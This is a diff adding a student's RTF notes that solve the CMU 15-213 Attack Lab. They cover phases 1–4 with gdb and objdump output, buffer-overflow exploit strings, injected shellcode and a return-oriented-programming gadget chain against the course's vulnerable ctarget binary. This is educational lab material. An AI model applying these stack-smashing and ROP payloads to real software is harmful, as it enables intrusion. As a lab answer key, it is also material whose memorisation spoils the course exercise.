@@ -1,0 +1,122 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1561\cocoasubrtf200
+{\fonttbl\f0\fnil\fcharset0 Menlo-Regular;}
+{\colortbl;\red255\green255\blue255;\red0\green0\blue0;\red255\green255\blue255;\red46\green174\blue187;
+\red180\green36\blue25;\red0\green0\blue0;}
+{\*\expandedcolortbl;;\csgray\c0;\csgray\c100000;\cssrgb\c20196\c73240\c78250;
+\cssrgb\c76409\c21698\c12524;\cssrgb\c0\c0\c0;}
+\margl1440\margr1440\vieww13060\viewh17160\viewkind0
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+
+\f0\fs22 \cf2 \cb3 \CocoaLigature0 1.\
+\
+gdb \'97args ctarget -q\
+break getbuf\
+run\
+00000000004017a8 <getbuf>:\
+  4017a8:	48 83 ec 28          	sub    $0x28,%rsp\
+  4017ac:	48 89 e7             	mov    %rsp,%rdi\
+  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>\
+  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax\
+  4017b9:	48 83 c4 28          	add    $0x28,%rsp\
+  4017bd:	c3                   	retq   \
+  4017be:	90                   	nop\
+  4017bf:	90                   	nop\
+And see the stack size is 40 bytes. Give 41 bytes to overlap the return address, and the 41th address should be the address of touch1.\
+\
+objdump -d ctarget\
+\
+00000000004017c0 <touch1>:\
+  4017c0:	48 83 ec 08          	sub    $0x8,%rsp\
+  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>\
+  4017cb:	00 00 00 \
+  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi\
+  4017d3:	e8 e8 f4 ff ff       	callq  400cc0 <puts@plt>\
+  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi\
+  4017dd:	e8 ab 04 00 00       	callq  401c8d <validate>\
+  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi\
+  4017e7:	e8 54 f6 ff ff       	callq  400e40 <exit@plt>\
+\
+So the address should be \'9100000000004017c0\'92, then compose the string using hex2raw, say \'9330 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00\'94 should be work.\
+\
+Cookie: 0x59b997fa\
+Type string:Touch1!: You called touch1()\
+Valid solution for level 1 with target ctarget\
+PASS: Would have posted the following:\
+	user id	bovik\
+	course	15213-f15\
+	lab	attacklab\
+	result	1:PASS:0xffffffff:ctarget:1:30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 30 C0 17 40 00 00 00 00 00 \
+\
+2.\
+\
+The address of touch2\
+ > objdump -d ctarget\
+00000000004017ec <touch2>:\
+  4017ec:	48 83 ec 08          	sub    $0x8,%rsp\
+  4017f0:	89 fa                	mov    %edi,%edx\
+\
+We need to put the cookie in  $rdi, and call touch2.\
+\
+Right the asm code\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf4 mov\cf2  $\cf5 0x59b997fa\cf2 , %\cf4 rdi\cf2 \
+\cf4 pushq\cf2  $\cf5 0x4017ec\cf2 \
+\cf4 ret\
+\
+\cf6 gcc -c compile and generate the machine code.\
+\pard\tx560\tx1120\tx1680\tx2240\tx2800\tx3360\tx3920\tx4480\tx5040\tx5600\tx6160\tx6720\pardirnatural\partightenfactor0
+\cf2 0000000000000000 <.text>:\
+   0:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi\
+   7:	68 ec 17 40 00       	pushq  $0x4017ec\
+   c:	c3                   	retq   \
+\
+Inject the code into buffer, trigger buffer overflow and jump to the address of $esp, where has out exploit code.\
+\
+3.\
+Modify solution in touch2,\
+\
+48 c7 c7 a8  dc 61 55 68  fa 18 40 00  c3 00 00 00 \
+00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00 \
+00 00 00 00  00 00 00 00  78 dc 61 55  00 00 00 00 \
+35 39 62 39  39 37 66 61\
+\
+78 dc 61 55 : address of %rsp\
+\
+0000000000000000 <.text>:\
+   0:	48 c7 c7 a4 dc 61 55 	mov    $0x5561dca4,%rdi\
+   7:	68 fa 18 40 00       	pushq  $0x4018fa\
+   c:	c3                   	retq \
+\
+After call, the stack may change, so we overflow a little more.\
+\
+Cookie: 0x59b997fa\
+Touch3!: You called touch3("59b997fa")\
+Valid solution for level 3 with target ctarget\
+PASS: Would have posted the following:\
+	user id	bovik\
+	course	15213-f15\
+	lab	attacklab\
+	result	1:PASS:0xffffffff:ctarget:3:48 C7 C7 A8 DC 61 55 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 \
+\
+4.\
+I find two gadget,\
+00000000004019a0 <addval_273>:\
+  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax\
+  4019a6:	c3                   	retq   \
+48 89 c7 -> movq %rax, %rdi\
+\
+00000000004019a7 <addval_219>:\
+  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax\
+  4019ad:	c3                   	retq   \
+58 90 -> popq %rax; nop;\
+\
+00000000004017ec <touch2>:\
+\
+00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00\
+00 00 00 00  00 00 00 00  00 00 00 00  00 00 00 00\
+00 00 00 00  00 00 00 00  ab 19 40 00  00 00 00 00\
+fa 97 b9 59  00 00 00 00  a2 19 40 00  00 00 00 00\
+ec 17 40 00  00 00 00 00\
+\
+5.\
+}
